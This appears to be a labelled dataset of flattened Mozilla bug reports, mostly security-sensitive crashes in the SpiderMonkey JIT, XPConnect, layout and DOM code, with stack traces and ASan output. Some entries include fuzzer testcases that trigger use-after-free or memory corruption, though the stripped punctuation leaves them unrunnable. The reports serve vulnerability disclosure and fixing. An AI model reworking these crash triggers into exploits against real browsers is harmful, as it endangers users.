mozilla-central/js/src/jsinterp.cpp:492 13 in js execute jscontext js handle jsscript jsobject js value mozilla-central/js/src/jsinterp.cpp:529 14 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value mozilla-central/js/src/jsapi.cpp:5708 15 in js evaluate jscontext js handle jsobject js compileoptions char const unsigned long js value mozilla-central/js/src/jsapi.cpp:5723 16 in processargs jscontext jsobject char int mozilla-central/js/xpconnect/shell/xpcshell.cpp:1215 17 in libc_start_main build/buildd/eglibc-2.13/csu/libc-start.c:258 is located 0 bytes to the right of 72-byte region allocated by thread t0 here 0 in interceptor_malloc 0 1 in nsstringbuffer alloc unsigned long mozilla-central/xpcom/string/src/nssubstring.cpp:177 2 in nsacstring_internal mutateprep unsigned int char unsigned int mozilla-central/xpcom/string/src/nstsubstring.cpp:130 3 in nsacstring_internal setcapacity unsigned int mozilla fallible_t const mozilla-central/xpcom/string/src/nstsubstring.cpp:553 4 in nsacstring_internal setcapacity unsigned int mozilla-central/xpcom/string/src/nstsubstring.cpp:532 5 in nsacstring_internal setlength unsigned int mozilla-central/xpcom/string/src/nstsubstring.cpp:583 6 in nsacstring_internal length const mozilla-central dist/include/nstsubstring.h:209 7 in callmethodhelper convertindependentparam unsigned char mozilla-central/js/xpconnect/src/xpcwrappednative.cpp:2882 8 in callmethodhelper convertindependentparams int mozilla-central/js/xpconnect/src/xpcwrappednative.cpp:2804 9 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode mozilla-central/js/xpconnect/src/xpcwrappednative.cpp:2418 10 in xpc_wn_callmethod jscontext unsigned int js value mozilla-central/js/xpconnect/src/xpcwrappednativejsops.cpp:1480 11 in 12 in js mjit entermethodjit jscontext js stackframe void js value bool mozilla-central/js/src/methodjit/methodjit.cpp:1016 13 in checkstackandentermethodjit jscontext js stackframe void bool mozilla-central/js/src/methodjit/methodjit.cpp:1074 14 in js interpret jscontext js stackframe js interpmode mozilla-central/js/src/jsinterp.cpp:1475 15 in js runscript jscontext jsscript js stackframe mozilla-central/js/src/jsinterp.cpp:308 16 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value mozilla-central/js/src/jsinterp.cpp:492 17 in js execute jscontext js handle jsscript jsobject js value mozilla-central/js/src/jsinterp.cpp:529 18 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value mozilla-central/js/src/jsapi.cpp:5708 19 in js evaluate jscontext js handle jsobject js compileoptions char const unsigned long js value mozilla-central/js/src/jsapi.cpp:5723 20 in processargs jscontext jsobject char int mozilla-central/js/xpconnect/shell/xpcshell.cpp:1215 21 in libc_start_main build/buildd/eglibc-2.13/csu/libc-start.c:258	11
window resize accessed a dangling documentviewerimpl i was n't able to reproduce this can you figure it out from the stacks and knowing that the fuzzer was opening and closing windows	11
addresssanitizer heap-use-after-free in js mjit callcompiler generatenativestub the following testcase triggers an asan error on mozilla-central revision e327e66a027d no options required function getterfunction v return getter object.defineproperty array.prototype 1 get getterfunction var n 10000 repeat_str try f finally n n repeat_str function repeat_str str repeat_count var arr new array repeat_count while repeat_count 0 arr repeat_count str return str.concat.apply str arr asan trace 24366 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in js mjit callcompiler generatenativestub js/src/methodjit/monoic.cpp:1082 1 in js mjit ic nativecall js vmframe js mjit ic callicinfo js/src/methodjit/monoic.cpp:1308 2 in throwpoline_exit js/src/methodjit/methodjit.cpp:0 3 in js mjit entermethodjit jscontext js stackframe void js value bool js/src/methodjit/methodjit.cpp:1045 4 in jscontext fp const js/src/methodjit/methodjit.cpp:1103 5 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:1487 6 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 7 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value js/src/jsinterp.cpp:509 8 in js execute jscontext js handle jsscript jsobject js value js/src/jsinterp.cpp:546 9 in js_executescript js/src/jsapi.cpp:5632 10 in process jscontext jsobject char const bool js/src/shell/js.cpp:439 11 in processargs jscontext jsobject js cli optionparser js/src/shell/js.cpp:4700 12 in main js/src/shell/js.cpp:4944 13 in libc_start_main 0 is located 748 bytes inside of 1028-byte region freed by thread t0 here 0 in interceptor_free 0 1 in js_free dist/include/js/utility.h:170 previously allocated by thread t0 here 0 in interceptor_calloc 0 1 in js_calloc dist/include/js/utility.h:159 2 in js mjit compiler performcompilation js/src/methodjit/compiler.cpp:564 3 in js mjit compiler compile js/src/methodjit/compiler.cpp:140 4 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:1480 5 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 6 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value js/src/jsinterp.cpp:509 7 in js execute jscontext js handle jsscript jsobject js value js/src/jsinterp.cpp:546 8 in js_executescript js/src/jsapi.cpp:5632 9 in process jscontext jsobject char const bool js/src/shell/js.cpp:439 10 in processargs jscontext jsobject js cli optionparser js/src/shell/js.cpp:4700 11 in main js/src/shell/js.cpp:4944 12 in libc_start_main 0 the issue is also visible in valgrind which might be easier for debugging purposes assuming sec-critical because it seems that we re using a jitchunk compiled part of a script after it has been free d	11
long lines with many warnings from javascript.options.strict cause memory spikes when a console or firebug is in use mozilla/5.0 macintosh intel mac os x 10.6 rv:2.0b12pre gecko/20110209 firefox/4.0b12pre id:20110209030359 we run into a huge memory leak which can also freeze the system just by performing the following steps 1 create a fresh profile and stick the attached users.js file into it 2 install the latest alpha version of firebug 1.7 3 open the given url within seconds the memory will be filled-up completely and the system can freeze this is a regression and happened between beta 7 and beta 8 i will nail down the regression range tomorrow morning	11
bug 754202 regressed iscapabilityenabled when there is no frame the result of iscapabilityenabled is always true this is not good since event listeners can be called with no frame	11
crash with newglobal newcontext dump-bytecode js m n a d var sandbox newglobal same-compartment function insandbox code evalcx code sandbox insandbox function six return 6 insandbox evaluate function qq return six newcontext true insandbox for j 0 j 2 j qq 0 crash in mjit code the first bad revision is changeset 648093316d93 user jason orendorff date thu may 17 18:54:30 2012 0500 summary bug 755808 add more options to js shell evaluate function r=jimb	11
assertion failure thing compartment iscollecting with bfcache canvas gcslice 1 set user_pref javascript.options.mem.gc_incremental false 2 install 3 load the testcase assertion failure thing compartment iscollecting at js/src/gc/marking.cpp:586 may be related to an intermittent orange bug 785582	11
assertion uh cx is not the current js context cx getcurrentjscontext setting location.href in scratchpad setting location.href in scratchpad asserts with assertion uh cx is not the current js context cx getcurrentjscontext file c dev/mozilla-central/caps/src/nsscriptsecuritymanager.cpp line 396 filing as security-sensitive just in case xul.dll ns_debugbreak_p unsigned int aseverity const char astr const char aexpr const char afile int aline line 264 c xul.dll nsscriptsecuritymanager getcxsubjectprincipalandframe jscontext cx jsstackframe fp line 396 bytes c xul.dll nslocation checkurl nsiuri auri nsidocshellloadinfo aloadinfo line 242 bytes c xul.dll nslocation seturi nsiuri auri bool areplace line 354 bytes c xul.dll nslocation sethrefwithbase const nsastring_internal ahref nsiuri abase bool areplace line 646 bytes c xul.dll nslocation sethrefwithcontext jscontext cx const nsastring_internal ahref bool areplace line 593 bytes c xul.dll nslocation sethref const nsastring_internal ahref line 562 bytes c xul.dll ns_invokebyindex_p nsisupports that unsigned int methodindex unsigned int paramcount nsxptcvariant params line 103 c xul.dll callmethodhelper invoke line 3021 bytes c xul.dll callmethodhelper call line 2354 c xul.dll xpcwrappednative callmethod xpccallcontext ccx xpcwrappednative callmode mode line 2318 bytes c xul.dll xpc_wn_gettersetter jscontext cx unsigned int argc js value vp line 1579 bytes c mozjs.dll js calljsnative jscontext cx int jscontext unsigned int js value native const js callargs args line 314 bytes c mozjs.dll js invokekernel jscontext cx js callargs args js maybeconstruct construct line 513 bytes c mozjs.dll js invoke jscontext cx const js value thisv const js value fval unsigned int argc js value argv js value rval line 560 bytes c mozjs.dll js invokegetterorsetter jscontext cx jsobject obj const js value fval unsigned int argc js value argv js value rval line 634 bytes c mozjs.dll js shape set jscontext cx jsobject obj bool strict js value vp line 311 bytes c mozjs.dll js_setpropertyhelper jscontext cx jsobject obj jsid id unsigned int definehow js value vp int strict line 5460 bytes c mozjs.dll jsobject setgeneric jscontext cx jsid id js value vp int strict line 172 bytes c mozjs.dll js wrapper set jscontext cx jsobject wrapper jsobject receiver jsid id bool strict js value vp line 234 bytes c mozjs.dll js crosscompartmentwrapper set jscontext cx jsobject wrapper jsobject receiver jsid id bool strict js value vp line 630 bytes c mozjs.dll js proxy set jscontext cx jsobject proxy jsobject receiver jsid id bool strict js value vp line 885 bytes c mozjs.dll proxy_setgeneric jscontext cx jsobject obj jsid id js value vp int strict line 1122 bytes c mozjs.dll jsobject nonnativesetproperty jscontext cx jsid id js value vp int strict line 3104 bytes c mozjs.dll jsobject setgeneric jscontext cx jsid id js value vp int strict line 171 bytes c mozjs.dll js setpropertyoperation jscontext cx unsigned char pc const js value lval const js value rval line 357 bytes c mozjs.dll js interpret jscontext cx js stackframe entryframe js interpmode interpmode line 2591 bytes c mozjs.dll js runscript jscontext cx jsscript script js stackframe fp line 469 bytes c mozjs.dll js executekernel jscontext cx jsscript script jsobject scopechain const js value thisv js executetype type js stackframe evalinframe js value result line 667 bytes c mozjs.dll js execute jscontext cx jsscript script jsobject scopechainarg js value rval line 709 bytes c mozjs.dll evaluateucscriptforprincipalscommon jscontext cx jsobject obj jsprincipals principals jsprincipals originprincipals const wchar_t chars unsigned int length const char filename unsigned int lineno js value rval jsversion compileversion line 5266 bytes c mozjs.dll js_evaluateucscriptforprincipals jscontext cx jsobject obj jsprincipals principals const wchar_t chars unsigned int length const char filename unsigned int lineno js value rval line 5277 bytes c xul.dll xpc_evalinsandbox jscontext cx jsobject sandbox const nsastring_internal source const char filename int lineno jsversion jsversion bool returnstringonly js value rval line 3501 bytes c xul.dll nsxpccomponents_utils evalinsandbox const nsastring_internal source const js value sandboxval const js value version const js value filenameval int linenumber jscontext cx unsigned char optionalargc js value retval line 3402 bytes c xul.dll ns_invokebyindex_p nsisupports that unsigned int methodindex unsigned int paramcount nsxptcvariant params line 103 c xul.dll callmethodhelper invoke line 3021 bytes c xul.dll callmethodhelper call line 2354 c xul.dll xpcwrappednative callmethod xpccallcontext ccx xpcwrappednative callmode mode line 2318 bytes c xul.dll xpc_wn_callmethod jscontext cx unsigned int argc js value vp line 1539 bytes c mozjs.dll js calljsnative jscontext cx int jscontext unsigned int js value native const js callargs args line 314 bytes c mozjs.dll js invokekernel jscontext cx js callargs args js maybeconstruct construct line 513 bytes c mozjs.dll js interpret jscontext cx js stackframe entryframe js interpmode interpmode line 2684 bytes c mozjs.dll js runscript jscontext cx jsscript script js stackframe fp line 469 bytes c mozjs.dll js invokekernel jscontext cx js callargs args js maybeconstruct construct line 531 c mozjs.dll js invoke jscontext cx const js value thisv const js value fval unsigned int argc js value argv js value rval line 560 bytes c mozjs.dll js_callfunctionvalue jscontext cx jsobject obj js value fval unsigned int argc js value argv js value rval line 5389 bytes c xul.dll nsjscontext calleventhandler nsisupports atarget jsobject ascope jsobject ahandler nsiarray aargv nsivariant arv line 1880 bytes c xul.dll nsjseventlistener handleevent nsidomevent aevent line 239 bytes c xul.dll nseventlistenermanager handleeventsubtype nslistenerstruct alistenerstruct nsidomeventlistener alistener nsidomevent adomevent nsidomeventtarget acurrenttarget unsigned int aphaseflags nscxpusher apusher line 744 c xul.dll nseventlistenermanager handleeventinternal nsprescontext aprescontext nsevent aevent nsidomevent adomevent nsidomeventtarget acurrenttarget unsigned int aflags nseventstatus aeventstatus nscxpusher apusher line 800 bytes c xul.dll nseventlistenermanager handleevent nsprescontext aprescontext nsevent aevent nsidomevent adomevent nsidomeventtarget acurrenttarget unsigned int aflags nseventstatus aeventstatus nscxpusher apusher line 169 bytes c xul.dll nseventtargetchainitem handleevent nseventchainpostvisitor avisitor unsigned int aflags bool amayhavenewlistenermanagers nscxpusher apusher line 216 c xul.dll nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor avisitor unsigned int aflags nsdispatchingcallback acallback bool amayhavenewlistenermanagers nscxpusher apusher line 349 c xul.dll nseventdispatcher dispatch nsisupports atarget nsprescontext aprescontext nsevent aevent nsidomevent adomevent nseventstatus aeventstatus nsdispatchingcallback acallback nscomarray nsidomeventtarget atargets line 681 bytes c xul.dll nseventdispatcher dispatchdomevent nsisupports atarget nsevent aevent nsidomevent adomevent nsprescontext aprescontext nseventstatus aeventstatus line 744 bytes c xul.dll nsinode dispatchevent nsidomevent aevent bool aretval line 1175 c xul.dll nscontentutils dispatchxulcommand nsicontent atarget bool atrusted nsidomevent asourceevent nsipresshell ashell bool actrl bool aalt bool ashift bool ameta line 5793 bytes c xul.dll nsxulelement prehandleevent nseventchainprevisitor avisitor line 1694 bytes c xul.dll nseventtargetchainitem prehandleevent nseventchainprevisitor avisitor line 276 bytes c xul.dll nseventdispatcher dispatch nsisupports atarget nsprescontext aprescontext nsevent aevent nsidomevent adomevent nseventstatus aeventstatus nsdispatchingcallback acallback nscomarray nsidomeventtarget atargets line 628 c xul.dll nseventdispatcher dispatchdomevent nsisupports atarget nsevent aevent nsidomevent adomevent nsprescontext aprescontext nseventstatus aeventstatus line 744 bytes c xul.dll presshell handledomeventwithtarget nsicontent atargetcontent nsidomevent aevent nseventstatus astatus line 6739 bytes c xul.dll nscontentutils dispatchxulcommand nsicontent atarget bool atrusted nsidomevent asourceevent nsipresshell ashell bool actrl bool aalt bool ashift bool ameta line 5787 bytes c xul.dll nsxulmenucommandevent run line 2362 bytes c xul.dll nsthread processnextevent bool maywait bool result line 657 bytes c xul.dll ns_processnextevent_p nsithread thread bool maywait line 245 bytes c	11
crash with svg use removed during its own scrollbar attribute mutation event bp-0cada683-3e71-482d-8d98-0c2d92120924 i m guessing this is a regression from bug 778810 which added the function mozilla scrollbaractivity activityoccurred why does scrolling set dom attributes	11
assertion failure next this prev this discarding images in linkedlist 1 lots of other examples in automation 2 assertion failure next this prev this at c work\mozilla\builds\nightly\mozilla\firefox-debug\dist\include\mozilla/linkedlist.h:165 mozilla linkedlistelement mozilla image discardtracker node isinlist mozilla image rasterimage discardingactive mozilla image rasterimage unlockimage imgrequestproxy unlockimage nsdocument removeimage imgirequest unsigned int reproduced on windows and linux so far also have seen windows crashes at nscomptr nsiweakreference nscomptr nsiweakreference mozilla image rasterimage rasterimage mozilla image rasterimage scalar deleting destructor unsigned int mozilla image rasterimage release nsrefptr mozilla image image nsrefptr mozilla image image imgrequest imgrequest that are rated low exploitable by breakpad there are a number of other stacks associated with this marking s-s crashes osx debug as well	11
possible memory corruption of nsdevicecontext bug 776505 involves an intermittent orange with assertion nsdevicecontext not thread-safe mowningthread.getthread pr_getcurrentthread roc landed an assertion in nsdevicecontext s constructor that it is being created on the main thread but it does not seem to be triggering in that case given that it seems that it is likely that there is some kind of memory corruption if the field that stores the thread id gets messed up then we ll fail this assertion even though it is only ever used on the main thread the stacks seem to always look like 0 xul nsdevicecontext addref nsdevicecontext.h 26 1 xul nsrenderingcontext init nsdevicecontext gfxcontext nsautoptr.h 845 2 xul presshell renderdocument nsrect const unsigned int unsigned int gfxcontext nspresshell.cpp 4359 3 xul mozilla dom canvasrenderingcontext2d drawwindow nsidomwindow double double double double nsastring_internal const unsigned int mozilla errorresult canvasrenderingcontext2d.cpp 3962 4 xul mozilla dom canvasrenderingcontext2dbinding drawwindow canvasrenderingcontext2dbinding.cpp 1868 5 xul mozilla dom canvasrenderingcontext2dbinding genericmethod canvasrenderingcontext2dbinding.cpp 2570 this is the strip of code in question 4347 nsdevicecontext devctx mprescontext devicecontext 4348 gfxfloat scale gfxfloat devctx appunitsperdevpixel nsprescontext appunitspercsspixel 4349 athebescontext scale scale scale 4354 athebescontext nudgecurrentmatrixtointegers 4356 autosaverestorerenderingstate this 4358 nsrefptr nsrenderingcontext rc new nsrenderingcontext 4359 rc init devctx athebescontext not knowing anything about this code my spideysense did start tingling at that raw pointer to the devctx this strongly holds mprescontext which strongly holds its device context but i guess if either of those fields changes in between line 4347 and 4359 then we could have a uaf to fix that problem devctx could become a strong pointer or just be inlined as it is only used twice we could also add an assert that devctx is the same as mprescontext devicecontext before the init assuming that should be the case kyle also suggested the possibility that devctx is just corrupt from the get-go this could be tested by landing an assertion in devicecontext to check valid threadedness of the nsdevicecontext i m slightly nervous about poking around with exploratory asserts as it points out possible security problems but maybe it is n't a big deal	11
crash with timeevent.view this is similar to bug 805749 but with timeevents instead of uievents	11
assertion function object has parent of unknown class assertion function object has parent of unknown class error file js/xpconnect/src/xpcwrappednative.cpp line 1779 smells cpg-related	11
crash nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool assertion unexpected flow mframes.containsframe nextinflow assertion stealframe ca n't find achild removed assertion stealframe failure ns_succe 1 assertion unexpected flow mframes.containsframe nextinflow file c work/mozilla/builds/nightly/mozilla/layout/generic/nsinlineframe.cpp line 500 assertion stealframe ca n't find achild removed file c work/mozilla/builds/nightly/mozilla/layout/generic/nscontainerframe.cpp line 1210 assertion stealframe failure ns_succeeded rv file c work/mozilla/builds/nightly/mozilla/layout/generic/nscontainerframe.cpp line 1339 crash nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool this appears to be beta/14 aurora/15 and nightly/16 though i am getting inconsistent results sometimes on different platforms	11
assertion failure infer failure missing type pushed 0 with iframes adoptnode with user_pref javascript.options.methodjit_always true the testcase triggers assertion failure infer failure missing type pushed 0 at js/src/jsinfer.cpp:325 based on js/xpconnect/crashtests/515726-1.html	11
make sure we always release stuff on the right thread since some of the structuredclone info structs can hold onto ccd objects we need to be sure we always empty them on the main thread	11
assertion failure lifetime lifetime head uint32_t head outerscript code lifetime entry uint32_t entrytarget outerscript code at methodjit/loopstate.cpp:80 the following test asserts on mozilla-central revision b5ae446888f5 options m n a function e try catch e return actual fail a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x a.x while t continue e i believe this is something different than bug 741110 and bug 770089 since the test looks entirely different and does n't depend on mjitchunklimit s-s due to previous bugs with that assertion being security-relevant	11
intermittent assertion in dom/devicestorage/test/test_basic.html assertion failure i length invalid array index at e builds\moz2_slave\m-in-w32-dbg\build\obj-firefox\dist\include\nstarray.h:526 a few of the other instances of this assertion have been marked as s-s so doing so for this just in case rev3 winnt 6.1 mozilla-inbound debug test mochitests-2/5 on 2012-08-21 05:53:12 pdt for push 94f6e5a00d8b slave talos-r3-w7-068 1 info test-start tests/dom/devicestorage/test/test_basic.html 1889 info test-pass tests/dom/devicestorage/ipc/test_ipc.html got second iframe load event domwindow 9 0847ec48 serial 9 outer 08588378 child 2600 warning ns_ensure_true ischromeprocess failed file e builds/moz2_slave/m-in-w32-dbg/build/content/base/src/nsframemessagemanager.cpp line 601 domwindow 10 085c04e0 serial 10 outer 08588378 1890 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html should have getdevicestorage 1891 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html should have gotten a storage 1892 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html should have a non-null request 1893 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html file name should match 1894 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html addsuccess was called 1895 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html should have getdevicestorage 1896 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html file name should match 1897 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html wrong arraybuffer bytelength 69 should equal 69 1898 info test-pass tests/dom/devicestorage/ipc/test_ipc.html tests/dom/devicestorage/test/test_basic.html wrong values my name is doug turner my irc nick is dougt i like maple cookies should equal my name is doug turner my irc nick is dougt i like maple cookies assertion failure i length invalid array index at e builds\moz2_slave\m-in-w32-dbg\build\obj-firefox\dist\include\nstarray.h:526 devicestorage/hi child 2600 warning shutting down early because of crash file e builds/moz2_slave/m-in-w32-dbg/build/dom/ipc/contentchild.cpp line 701 child 2600 warning content process exit ing file e builds/moz2_slave/m-in-w32-dbg/build/dom/ipc/contentchild.cpp line 746 nsstringstats malloccount 8042 mrealloccount 587 mfreecount 3728 leaked 4314 msharecount 16580 madoptcount 933 madoptfreecount 931 leaked 2 test-unexpected-fail tests/dom/devicestorage/test/test_basic.html exited with code 2147483645 during test run info automation.py application ran for 0:04:34.412000 info automation.py reading pid log c users\cltbld\appdata\local\temp\tmpuclywqpidlog process 3472 launched child process 2600 info automation.py checking for orphan process with pid 2600 downloading symbols from process-crash tests/dom/devicestorage/test/test_basic.html application crashed minidump found crash dump filename c users\cltbld\appdata\local\temp\tmpinfdxz\minidumps\504e12ce-a5a6-48c1-91e6-06f09751a7d2.dmp operating system windows nt 6.1.7600 cpu x86 genuineintel family 6 model 23 stepping 10 2 cpus crash reason exception_breakpoint crash address thread 0 crashed 0 xul.dll nstarray nsrefptr mozilla dom devicestorage devicestoragerequestparent cancelablerunnable nstarraydefaultallocator elementat unsigned int nstarray.h:94f6e5a00d8b 526 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll mozilla dom devicestorage devicestoragerequestparent actordestroy mozilla ipc iprotocolmanager mozilla ipc rpcchannel rpclistener actordestroyreason devicestoragerequestparent.cpp:94f6e5a00d8b 132 eip esp ebp found by call frame info 2 xul.dll mozilla dom devicestorage pdevicestoragerequestparent destroysubtree mozilla ipc iprotocolmanager mozilla ipc rpcchannel rpclistener actordestroyreason pdevicestoragerequestparent.cpp:94f6e5a00d8b 332 eip esp ebp found by stack scanning 3 xul.dll mozilla dom devicestorage pdevicestoragerequestparent send__delete mozilla dom devicestorage pdevicestoragerequestparent mozilla dom devicestorage devicestorageresponsevalue const pdevicestoragerequestparent.cpp:94f6e5a00d8b 96 eip esp ebp found by call frame info 4 xul.dll mozilla dom devicestorage devicestoragerequestparent postpathresultevent cancelablerun devicestoragerequestparent.cpp:94f6e5a00d8b 434 eip esp ebp found by call frame info 5 xul.dll mozilla dom devicestorage devicestoragerequestparent cancelablerunnable run devicestoragerequestparent.h:94f6e5a00d8b 51 eip esp ebp found by call frame info 6 xul.dll nsthread processnextevent bool bool nsthread.cpp:94f6e5a00d8b 624 eip esp ebp found by call frame info 7 xul.dll ns_processnextevent_p nsithread bool nsthreadutils.cpp:94f6e5a00d8b 220 eip esp ebp found by call frame info 8 xul.dll mozilla ipc messagepump run base messagepump delegate messagepump.cpp:94f6e5a00d8b 116 eip esp ebp	11
crash nsstylecontext getrulenode with deleted this 1 2 crash nsstylecontext getrulenode nsiframe prescontext nsrootprescontext requestupdateplugingeometry nsiframe presshell doreflow nsiframe bool presshell processreflowcommands bool nightly linux 32bit and windows 7 64bit see bug 781279 comment 15 crash address in windows when you do n't get a flash related crash is while in linux it is on linux i see nsstylecontext getrulenode this at dist/include/nsstylecontext.h:190 bp-e7968d4a-42bb-4df7-98ef-920df2120830 not very reproducible in opt build but pretty much so in debug	11
assertion failure infer failure missing type pushed 0 at jsinfer.cpp:328 the following testcase asserts on ionmonkey revision 0b296feed34c run with ion n m ion-eager a function testcase n d e a this.name n function reportcompare expected actual description var testcase new testcase unknown-test-name description expected actual evaluate reportcompare true true noscriptrval true evaluate 2 testcase noscriptrval true	11
video playback causes browser to stop responding mostly or crash in cleopatra tool visiting bgirard/cleopatra zippedprofile=profiles/sps-profile-1346944481.42.zip videocapture=videos/video-1346944481.42.webm in firefox nightly in windows causes the browser to crash usually or sometimes become very unresponsive and use lots of memory possibly the lack of responsiveness is down to paging i ve not been able to profile this as i ca n't get it running reliably enough to do anything with it hopefully a windows developer/someone more familiar with windows can look at this works fine in firefox 15 on linux	11
assertion failure checkmtextrun mtextrun properties get uninflatedtextrunproperty with font inflation moz-column with user_pref font.size.inflation.emperline 15 loading the testcase triggers assertion failure checkmtextrun mtextrun properties get uninflatedtextrunproperty at users/jruderman/trees/mozilla-central/layout/generic/nstextframethebes.cpp:4373 security-sensitive because the assertion was added in a security-sensitive bug	11
supposedly infallible tarray can fail to allocate a buffer nstarray_base alloc ensurecapacity has this bit if uint64_t capacity elemsize size_type 1 2 ns_error attempting to allocate excessively large array return false if alloc is nstarrayinfallibleallocator we should be aborting here instead of returning false i believe	11
read after free in nsxpcwrappedjs release i ve seen this twice now on m-c startups on android 4.0 sorry for no line numbers i will try to get a line-numberised version i could n't figure out what component to select thread 33 invalid read of size 4 at nsxpcwrappedjs release in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsxptcstubbase release in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by urlclassifierupdateobserverproxy release in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsrefptr nscaret assign_with_addref nscaret in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsurlclassifierdbserviceworker finishupdate in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsrunnablemethodimpl void nspacman true run in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsthread processnextevent bool bool in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by ns_processnextevent_p nsithread bool in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsthread threadfunc void in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by pt_root ptthread.c:156 by thread_entry pthread.c:217 by pthread_create pthread.c:357 by address is 32 bytes inside a block of size 60 free d at free vg_replace_malloc.c:446 by moz_free mozalloc.cpp:51 by nsxpcwrappedjs nsxpcwrappedjs in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsxpcwrappedjs release in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsproxyreleaseevent run in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsthread processnextevent bool bool in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by ns_processnextevent_p nsithread bool in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by mozilla ipc messagepump run base messagepump delegate in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by messageloop runinternal in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by messageloop runhandler in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by messageloop run in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsbaseappshell run in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by nsappstartup run in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by xremain xre_mainrun in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by xremain xre_main int char nsxreappdata const in data/data/org.mozilla.fennec_sewardj/cache/libxul.so by xre_main in data/data/org.mozilla.fennec_sewardj/cache/libxul.so	11
assertion failure lifetime entry uint32_t entrytarget outerscript code function f switch 2 default y newglobal return function code try evalcx code y catch e function h code g code g f mjitchunklimit 1 h let x=s h switch x case 2 break b default while this asserts js debug shell on m-c changeset 640a57ebab48 without any cli arguments at assertion failure lifetime entry uint32_t entrytarget outerscript code s-s because bug 781859 is s-s also adapting flags from that bug this is likely fixed by the upcoming patch in bug 781859 filing to hopefully get this testcase in the tree	11
weakmaps with keys from another compartment are possible and incorrect this is a regression from bug 673468 somehow i convinced myself this was okay but i m now pretty sure that we can have problems from this i ll try to get a testcase on monday	11
assertion failure fe istype type at methodjit/compiler.cpp:7623 the following test asserts on mozilla-central revision ad7963c93bd8 options m a n try a function f o o 5 with a f catch exc1 evaluate f	11
simultaneous calls to nsbuiltindecoderstatemachine stopaudiothread cause problems our code assumes that after the state machine thread has called stopaudiothread the audio thread is stopped there is a situation where this is not true setaudiocaptured gets called on the main thread calling stopaudiothread from the main thread main-thread stopaudiothread calls shutdown on the audio thread and waits for it to shut down meanwhile nsbuiltindecoderstatemachine calls stopaudiothread state machine thread stopaudiothread calls shutdown on the audio thread and returns immediately with an error because a thread can only be shut down by a single other thread state machine thread carries on and cleans up stuff the audio thread is using crash	11
crash in nswindow onpaint it first appeared in 19.0a1/20121025 the regression range is signature mozilla layers imagecontainer release more reports search uuid 08f4bce0-c20d-4cee-bee6-221822121026 date processed 2012-10-26 07:17:09 uptime 16 install age 16 seconds since version was first installed install time 2012-10-26 07:16:28 product firefox version 19.0a1 build id 20121025030620 release channel nightly os windows nt os version 6.1.7601 service pack 1 build architecture x86 build architecture info authenticamd family 16 model 6 stepping 2 crash reason exception_access_violation_write crash address app notes adaptervendorid adapterdeviceid adaptersubsysid 00000000 adapterdriverversion 8.713.3.0 d3d10 layers d3d10 layers processor notes this dump is too long and has triggered the automatic truncation routine emcheckcompatibility true adapter vendor id adapter device id total virtual memory 4294836224 available virtual memory 3903037440 system memory use percentage 55 available page file 2922856448 available physical memory 951963648 frame module signature source 0 xul.dll mozilla layers imagecontainer release obj-firefox/dist/include/imagecontainer.h:265 1 xul.dll nsrefptr mozilla layers imagecontainer nsrefptr mozilla layers imageconta obj-firefox/dist/include/nsautoptr.h:874 